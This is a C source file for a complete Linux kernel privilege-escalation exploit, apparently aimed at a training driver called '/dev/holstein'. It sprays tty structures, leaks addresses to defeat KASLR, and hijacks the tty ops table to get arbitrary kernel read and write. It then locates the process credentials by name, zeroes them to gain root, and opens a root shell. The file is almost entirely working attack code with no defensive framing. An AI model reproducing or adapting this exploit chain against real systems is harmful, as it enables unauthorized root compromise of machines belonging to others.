#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc38880
#define orderly_poweroff_function (kbase + 0x750E0)
#define poweroff_cmd (kbase + 0xe379c0)
#define rop_mov_qrdx_rcx (kbase + 0x0477f7)
#define rop_mov_rax_qrdx (kbase + 0x18a285)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
uint64_t kbase, g_buf;
uint32_t spray[100];
uint32_t fd;
char buf[0x500];
uint32_t cache_fd = -1;

void AAW32(uint64_t addr, uint32_t val) {
    uint64_t *p = (uint64_t *)&buf;
    p[12] = rop_mov_qrdx_rcx; // ioctl soutou
    *(uint64_t*)&buf[0x418] = g_buf; // overwrite ops table with buf address
    write(fd, buf, 0x420);

    if (cache_fd == -1) {
        for (uint32_t i = 0; i < 100; i++) {
            uint32_t v = ioctl(spray[i], val /* rcx */, addr /* rdx */);
            if (v != -1) {
                cache_fd = spray[i];
                break;
            }
        }
    } else {
        ioctl(cache_fd, val /* rcx */, addr /* rdx */);
    }
}

uint32_t AAR32(uint64_t addr) {
    uint64_t *p = (uint64_t *)&buf;
    p[12] = rop_mov_rax_qrdx; // ioctl soutou
    *(uint64_t*)&buf[0x418] = g_buf; // overwrite ops table with buf address
    write(fd, buf, 0x420);

    if (cache_fd == -1) {
        for (uint32_t i = 0; i < 100; i++) {
            uint32_t v = ioctl(spray[i], 0xdeadbeef /* rcx */, addr /* rdx */);
            if (v != -1) {
                cache_fd = spray[i];
                return v;
            }
        }
    } else {
        return ioctl(cache_fd, 0xdeadbeef /* rcx */, addr /* rdx */);
    }
}

int main()
{
    // START SPRAY
    for (int i = 0; i < 50; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }

    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        ERROR("/dev/holstein");

    for (int i = 50; i < 100; i++) {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if (spray[i] == -1)
            ERROR("/dev/ptmx");
    }
    // END SPRAY

    // KASLRの回避
    read(fd, buf, 0x500);

    kbase = *(uint64_t*)&buf[0x418] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);

    g_buf = *(uint64_t*)&buf[0x438] - 0x438;
    printf("[+] g_buf = 0x%016lx\n", g_buf);
    // END KASLRの回避

    // task_structの探索
    if (prctl(PR_SET_NAME, "nekomaru") != 0)
        ERROR("/prctl");

    uint64_t addr;

    INFO("searching from 0x%016lx", g_buf - 0x1000000);
    for (addr = g_buf - 0x1000000; ; addr += 0x8) {
        if ((addr & 0xfffff) == 0) {
            INFO("searching... 0x%016lx", addr);
        }

        if (AAR32(addr) == 0x6f6b656e && AAR32(addr + 0x4) == 0x7572616d) {
            SUCCESS("Found 'comm' at 0x%016lx", addr);
            break;
        }
    }

    uint64_t addr_cred = 0;
    addr_cred = AAR32(addr - 0x8);
    addr_cred |= (uint64_t)AAR32(addr - 0x4) << 32;
    SUCCESS("current->cred = 0x%016lx", addr_cred);

    // 実効IDの上書き
    for (int i = 1; i <= 8; i++) {
        AAW32(addr_cred + i*4, 0);
    }

    SUCCESS("pwned!");
    system("/bin/sh");
    return 0;
}